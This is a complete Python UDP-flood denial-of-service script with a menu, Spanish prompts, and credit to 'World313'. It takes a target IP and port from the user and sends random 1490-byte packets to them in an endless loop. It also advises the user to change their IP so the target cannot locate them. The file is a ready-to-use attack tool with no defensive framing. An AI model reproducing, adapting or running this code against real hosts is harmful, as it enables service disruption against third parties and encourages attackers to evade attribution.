#Code by World313 (CalledLeader551)
from os import system
import socket
import random
import banner

#This function start the DoS attack
def dos(ip, port):
    
    #packages counter
    sent = 0
    
    while True:
        sock.sendto(bytes, (ip,port))
        sent += 1
        print('\033[0;32m'+'Se enviaron '+'\033[0;31m'+f'{sent}'+'\033[0;32m'+' a '+'\033[0;31m'+f'{ip}'+'\033[0;32m'+' por el puerto '+'\033[0;31m'+f'{port}')
        if port == 65534:
            port = 1


sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)

#Start of the program
system('clear')
banner.banner()
print('\033[0;32m'+'\n\t\t\t   by World313\n\t\t\t[CalledLeader551]\n')
input('\033[0;33m'+'\t\t Presione Enter para continuar...')

#Menu
system('clear')
banner.menu()
while True:
    options = input('\033[0;32m' + 'Input -> ').lower()
    #DDoS Attack
    if options=='1':
        system('clear')
        while True:
            print('\033[1;33m' + 'Al hacer este ataque recomendamos que cambie su IP, asi el objetivo no podra localizar su ubicación')
            print('\033[1;36m' + '\nDesea continuar?\n' + '\033[0;36m' + '  [y] Continuar\n  [n] Volver al menu\n')
            question = input('\033[0;32m' + 'Input -> ')
            if question=='y':
                system('clear')
                while True:
                    ip = input('\033[1;33m'+'IP del objetivo: '+'\033[1;32m')
                    port = input('\033[1;33m'+'Puerto: '+'\033[1;32m')
                    try:
                        port = int(port)
                        try:
                            sock.sendto(bytes, (ip, port))
                            dos(ip, port)
                            
                        except socket.gaierror:
                            system('clear')
                            print(f'2 posibles errores:\n    "La IP: {ip}" No es valida.\n    La "{ip}" No esta asociada con el puerto: "{port}".\n')
                            
                    except ValueError:
                        system('clear')
                        if port=='':
                            print('No puedes dejar el puerto vacio\n')
                            
                        else:
                            print(f'El puerto "{port}" no es valido\n')
                            
            elif question=='n':
                system('clear')
                banner.menu()
                break
                
            else:
                system('clear')
                print('Caracter no valida\n') 
                
    #Close program
    elif options=='x':
        system('clear')
        print('Programa cerrado')
        break
        
    #Unknown character
    else:
        system('clear')
        banner.menu()
        print('\033[0;31m'+f'El caracter "{options}" no existe\n')
